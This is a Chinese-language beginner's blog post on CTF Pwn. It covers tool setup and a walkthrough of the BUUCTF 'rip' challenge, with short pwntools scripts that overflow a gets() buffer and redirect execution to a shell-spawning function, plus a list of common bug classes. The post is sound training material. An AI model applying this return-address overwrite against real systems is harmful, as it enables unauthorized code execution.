title=\"Pwn的理论工具准备\"></a>Pwn的理论工具准备</h1><h3 id=\"初学\"><a href=\"#初学\" class=\"headerlink\" title=\"初学\"></a>初学</h3><h5 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h5><ol>\n<li>Python 2.x 至于为什么不用python3后面会讲到</li>\n<li>Linux Windows用户推荐wsl2或虚拟机，MacOS不太清楚</li>\n<li>IDA pro 一个逆向分析工具</li>\n<li><a href=\"https://docs.pwntools.com/en/latest/install.html\">Pwntools</a> 一个漏洞利用框架工具</li>\n<li><a href=\"https://blog.csdn.net/qq_43430261/article/details/105516051\">checksec</a> ELF保护分析工具</li>\n</ol>\n<h5 id=\"储备知识\"><a href=\"#储备知识\" class=\"headerlink\" title=\"储备知识\"></a>储备知识</h5><ol>\n<li>C语言</li>\n<li>基础Python2语言，及库的用法</li>\n<li>源&#x2F;伪代码阅读和BUG漏洞寻找能力</li>\n<li>基础Linux命令</li>\n</ol>\n<p>以上可以进行简单的栈溢出的学习</p>\n<h3 id=\"入门\"><a href=\"#入门\" class=\"headerlink\" title=\"入门\"></a>入门</h3><h5 id=\"工具-1\"><a href=\"#工具-1\" class=\"headerlink\" title=\"工具\"></a>工具</h5><ol>\n<li><a href=\"https://github.com/pwndbg/pwndbg\">pwndbg</a> gdb动态调试插件</li>\n<li><a href=\"https://github.com/lieanu/LibcSearcher\">Libcsearcher</a> 集成libc查找工具</li>\n<li><a href=\"https://github.com/david942j/one_gadget\">one_gadget</a> 一句话提权指令搜索工具</li>\n<li><a href=\"https://blog.csdn.net/weixin_30414635/article/details/98030954\">ROPgadget</a> rop指令流搜索</li>\n</ol>\n<h5 id=\"储备知识-1\"><a href=\"#储备知识-1\" class=\"headerlink\" title=\"储备知识\"></a>储备知识</h5><ol>\n<li>C&#x2F;C++语言</li>\n<li>基础Python2语言，及库的用法</li>\n<li>ELF文件结构</li>\n<li>深度理解计算机系统（CSAPP）初步</li>\n</ol>\n<p>加上以上的可以更方便的学习进阶栈溢出、堆利用等知识</p>\n<h1 id=\"Pwn的学习\"><a href=\"#Pwn的学习\" class=\"headerlink\" title=\"Pwn的学习\"></a>Pwn的学习</h1><h3 id=\"初学-从Writeup中学习\"><a href=\"#初学-从Writeup中学习\" class=\"headerlink\" title=\"初学-从Writeup中学习\"></a>初学-从Writeup中学习</h3><p>网站推荐</p>\n<ol>\n<li><a href=\"https://adworld.xctf.org.cn/task?now_checked_num=2&name=pwn\">Xctf攻防世界</a> 站内内置writeup，但最近pwn环境无法分发</li>\n<li><a href=\"https://ctf.bugku.com/challenges/index/gid/1/tid/8.html\">Bugku</a> pwn环境可以分发，但需要自行查找writeup，题量少</li>\n<li><a href=\"https://buuoj.cn/\">buuctf</a> pwn环境可以分发，有N1BOOK配套习题（但好像环境坏了？），比赛真题，题量大，但需要自行查找writeup</li>\n</ol>\n<h3 id=\"入门-从比赛中学习\"><a href=\"#入门-从比赛中学习\" class=\"headerlink\" title=\"入门-从比赛中学习\"></a>入门-从比赛中学习</h3><p>参加比赛，利用比赛同时练习技术，这样可以更好的抓住比赛的中pwn的热点，也可以培养随机应变的能力。</p>\n<h1 id=\"Pwn的环境准备\"><a href=\"#Pwn的环境准备\" class=\"headerlink\" title=\"Pwn的环境准备\"></a>Pwn的环境准备</h1><p>由于没有尝试过MacOS上pwn<br>所以只有Windows的教程</p>\n<h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><ol>\n<li>安装WSL2（子系统） <a href=\"https://docs.microsoft.com/zh-cn/windows/wsl/install-win10\">https://docs.microsoft.com/zh-cn/windows/wsl/install-win10</a></li>\n<li>在WSL中安装Python2 <a href=\"https://www.cnblogs.com/dancesir/p/14201267.html\">https://www.cnblogs.com/dancesir/p/14201267.html</a></li>\n<li>在WSL中安装pwntools等库<a href=\"https://docs.pwntools.com/en/latest/install.html\">https://docs.pwntools.com/en/latest/install.html</a></li>\n<li>在WSL中安装checksec <a href=\"https://www.cnblogs.com/luocodes/p/13894106.html\">https://www.cnblogs.com/luocodes/p/13894106.html</a></li>\n<li>选择一个你喜欢的IDE，强推<a href=\"https://code.visualstudio.com/\">VSCode</a></li>\n</ol>\n<h5 id=\"在Vscode中配置Pwn中环境\"><a href=\"#在Vscode中配置Pwn中环境\" class=\"headerlink\" title=\"在Vscode中配置Pwn中环境\"></a>在Vscode中配置Pwn中环境</h5><p>安装Remote - WSL插件</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20210605202817993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"11111\"><br>即可可切换成Ubuntu终端<br><img src=\"https://img-blog.csdnimg.cn/20210606012526558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"ssss\"></p>\n<h6 id=\"在Vscode中Pwn\"><a href=\"#在Vscode中Pwn\" class=\"headerlink\" title=\"在Vscode中Pwn\"></a>在Vscode中Pwn</h6><p> 1.右键-在Vscode中打开文件夹</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20210605205021437.png\" alt=\"在Vscode中打开文件夹\"><br>2.左下角点击&gt;&lt;旋转Reopen Folder in WSL （这个尝试过编写exp时没有代码提示，可以在windows上先装python2和pwntools，在windows上编写exp，然后再Linux上运行，即跳过此步骤）<br><img src=\"https://img-blog.csdnimg.cn/20210605205106771.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20210605205146255.png\" alt=\"reopen\"></p>\n<p>3.新建一个exp.py<br><img src=\"https://img-blog.csdnimg.cn/2021060520552090.png\" alt=\"exp\"><br>4.开始书写你的脚本<br><img src=\"https://img-blog.csdnimg.cn/20210605205553278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"ok\"></p>\n<h3 id=\"Pwntools的学习\"><a href=\"#Pwntools的学习\" class=\"headerlink\" title=\"Pwntools的学习\"></a>Pwntools的学习</h3><p>官方文档<a href=\"https://docs.pwntools.com/en/latest/intro.html\">https://docs.pwntools.com/en/latest/intro.html</a></p>\n<h5 id=\"简易快速入门\"><a href=\"#简易快速入门\" class=\"headerlink\" title=\"简易快速入门\"></a>简易快速入门</h5><p>导入Pwntools<br><code>from pwn import *</code><br>链接<br><code>r = remote(&quot;目标地址str类型&quot;, 目标端口int类型)</code>与服务器交互<br><code>r = process(&quot;目标程序位置&quot;)</code>与本地程序交互<br>构造playload之打包<br><code>p64(int)</code>将int类型打包成64位存储<br><code>p32(int)</code>将int类型打包成32位存储<br>发送<br><code>r.sendline(playload)</code>发送playload为一行（自动在尾部加上\\n）<br>接收<br><code>r.recv()</code>接收到结束<br><code>r.recvuntil(end, drop=True)</code>end(str)接受到end之后截至，drop&#x3D;True时不包括end，drop&#x3D;False时包括end<br>打开交互<br><code>r.interactive()</code>一般在末尾都要加</p>\n<h1 id=\"Pwn的做题流程\"><a href=\"#Pwn的做题流程\" class=\"headerlink\" title=\"Pwn的做题流程\"></a>Pwn的做题流程</h1><ol>\n<li>使用checksec检查ELF文件保护开启的状态</li>\n<li>IDApro逆向分析程序漏洞（逻辑复杂的可以使用动态调试）</li>\n<li>编写python的exp脚本进行攻击</li>\n<li>（若攻击不成功）进行GDB动态调试，查找原因</li>\n<li>（若攻击成功）获取flag，编写Writeup<br>注：此做题流程并不完全概括，需要具体情况具体分析</li>\n</ol>\n<h1 id=\"Pwn的简单例子\"><a href=\"#Pwn的简单例子\" class=\"headerlink\" title=\"Pwn的简单例子\"></a>Pwn的简单例子</h1><p>题目来源<a href=\"https://buuoj.cn/challenges#rip\">【BUUCTF PWN】rip</a></p>\n<h3 id=\"checksec\"><a href=\"#checksec\" class=\"headerlink\" title=\"checksec\"></a>checksec</h3><p><img src=\"https://img-blog.csdnimg.cn/20210605215004844.png\" alt=\"在这里插入图片描述\"><br>64位，导入IDA 64，找到main函数，按F5或是Tab</p>\n<h3 id=\"分析函数及漏洞\"><a href=\"#分析函数及漏洞\" class=\"headerlink\" title=\"分析函数及漏洞\"></a>分析函数及漏洞</h3><h5 id=\"main函数\"><a href=\"#main函数\" class=\"headerlink\" title=\"main函数\"></a>main函数</h5><p><img src=\"https://img-blog.csdnimg.cn/20210606001412491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"main\"><br>main函数中存在gets(无限读入字符串漏洞)，没有开canary可以自由栈溢出<br>双击s变量，进入main函数栈区<br><img src=\"https://img-blog.csdnimg.cn/20210606002336319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"stack\"><br>发现s参数位置距离main函数返回地址距离是0xF+0x8个字节<br>（位于000000000处的s是存上一个ebp的值，用于恢复上一个函数，位于0000000008处的r是这个函数的返回地址）<br>只需要覆盖返回地址r，使它变成我们想要的函数地址，就可以劫持程序，让程序执行完main就执行我们想要的函数（这个题目就是fun函数）。</p>\n<h5 id=\"fun函数\"><a href=\"#fun函数\" class=\"headerlink\" title=\"fun函数\"></a>fun函数</h5><p><img src=\"https://img-blog.csdnimg.cn/20210606001433970.png\" alt=\"fun\"><br>system函数可以执行命令，&#x2F;bin&#x2F;sh是执行Linux的命令行程序，也就是可以getshell（提权）<br>按Tab+Space<br><img src=\"https://img-blog.csdnimg.cn/20210606002958267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"aa\"><br>查看fun函数的开始地址（图中0x0401186位置）</p>\n<h3 id=\"编写exp\"><a href=\"#编写exp\" class=\"headerlink\" title=\"编写exp\"></a>编写exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./pwn1&#x27;</span>) <span class=\"comment\"># 调试时使用本地链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = <span class=\"string\">&quot;a&quot;</span>*(<span class=\"number\">0xf</span> + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x0401186</span>) </span><br><span class=\"line\"><span class=\"comment\"># 覆盖到r前面之后，将0x0401186打包，覆盖main函数返回地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(p1) <span class=\"comment\"># 发送playload</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive() <span class=\"comment\"># 开启交互</span></span><br></pre></td></tr></table></figure>\n\n<p>运行<br><img src=\"https://img-blog.csdnimg.cn/202106060037015.png\" alt=\"000\"><br>并没有打通<br>需要平衡栈帧（初学可以跳过这个，直接记住结论）<br>即需要多return一次<br>x86汇编中 ret的指令类似于 先pop（弹出）一个值然后jmp（跳转）到这个值的位置继续执行<br>所以寻找一个ret的地址<br><img src=\"https://img-blog.csdnimg.cn/20210606004505446.png\" alt=\"ret\"><br>在main函数的结尾就有个retn<br>故修改exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./pwn1&#x27;</span>) <span class=\"comment\"># 调试时使用本地链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = <span class=\"string\">&quot;a&quot;</span>*(<span class=\"number\">0xf</span> + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x0401185</span>) + p64(<span class=\"number\">0x0401186</span>) </span><br><span class=\"line\"><span class=\"comment\"># 覆盖到r前面之后，先覆盖main函数返回地址为retn，再将0x0401186打包，覆盖retn的返回地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(p1) <span class=\"comment\"># 发送playload</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive() <span class=\"comment\"># 开启交互</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20210606004624249.png\" alt=\"show\"><br>发现<code>ls</code>(linux中查看当前文件夹内容的命令)命令可以执行<br>再修改exp链接靶机</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;node3.buuoj.cn&quot;</span>, <span class=\"number\">29885</span>) <span class=\"comment\"># 正式攻击时与靶机交互</span></span><br><span class=\"line\"><span class=\"comment\"># r = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = <span class=\"string\">&quot;a&quot;</span>*(<span class=\"number\">0xf</span> + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x0401185</span>) + p64(<span class=\"number\">0x0401186</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(p1)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>再次运行<br><img src=\"https://img-blog.csdnimg.cn/20210606005015347.png\" alt=\"sss\"><br>获取flag<br><code>cat</code>(linux中直接输出文件内容的命令)<br>到此就可以庆祝一下提交flag了</p>\n<h3 id=\"编写Writeup\"><a href=\"#编写Writeup\" class=\"headerlink\" title=\"编写Writeup\"></a>编写Writeup</h3><p>提交完flag之后别忘了编写Writeup，Writeup是指记录解题思路的文档，一个小队开一个公共编辑的文档，一旦做出来题目就要将解题思路、exp、部分截图写入文档，因为一般赛事最后需要提交Writeup，以确保你不是py得到的flag</p>\n<h1 id=\"Pwn的常见漏洞\"><a href=\"#Pwn的常见漏洞\" class=\"headerlink\" title=\"Pwn的常见漏洞\"></a>Pwn的常见漏洞</h1><h3 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h3><ol>\n<li><code>gets();</code>无限字符读入\\n停止</li>\n<li><code>scanf(&quot;%s&quot;);</code>无限字符读入\\n停止</li>\n<li><code>read(0,buf,0x200);</code>buf位置到返回地址距离小于0x200</li>\n</ol>\n<h3 id=\"数组下标溢出\"><a href=\"#数组下标溢出\" class=\"headerlink\" title=\"数组下标溢出\"></a>数组下标溢出</h3><ol>\n<li>没有判断上界或下界，配合读入或输出，可以任意位置读入或输出</li>\n</ol>\n<h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><ol>\n<li>主要利用<code>printf</code>的格式化字符串漏洞，实现栈区内读写</li>\n</ol>\n<h3 id=\"堆利用\"><a href=\"#堆利用\" class=\"headerlink\" title=\"堆利用\"></a>堆利用</h3><ol>\n<li>UAF(Use After Free)</li>\n<li>劫持__malloc_hook</li>\n<li>修改__IO_1_2_stdout</li>\n</ol>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><ol>\n<li>学习Pwn不仅有利于网安方向的同学，还有利于搞开发等同学，因为可以接触更加底层的东西，提高自己网络安全意识</li>\n<li>刚开始学习Pwn是摸着黑，照猫画虎的，只有不断的理解原理才能独立想出解题方法</li>\n<li>为什么不使用Python3？因为这是个坑，我刚开始尝试的是后就因为python3多了个bytes类型，导致p64()的结果不能直接与str相加，而其中有很多不可见字符，最终放弃了Python3。Python2中bytes值以str形式存储的可以直接与str相加。</li>\n<li>Pwn的世界错综复杂，我依然还在摸索，一起加油。</li>\n</ol>\n","path":"/p/Pwn-zero2something/","permalink":"https://blog.csome.cc/p/Pwn-zero2something/","tags":[{"name":"CTF","_id":"cuidFcrw31p392OYAhl29GF8x","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":16},{"name":"Pwn","_id":"cuid6dYiLzY6rlb0DVRH_kMX5","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":16}],"categories":[],"prev":{"title":"2021xp0int杯新生赛 Pwn wp","date":"2021-12-13T15:52:05.000Z","slug":"xp0intCTF-wp","published":true,"updated":"2025-10-28T08:00:40.791Z","_id":"cuid6SC3Yxc-84izKlAusrSFx","layout":"post","photos":[],"excerpt":"","path":"/p/xp0intCTF-wp/","permalink":"https://blog.csome.cc/p/xp0intCTF-wp/","__post":true},"next":null,"__post":true}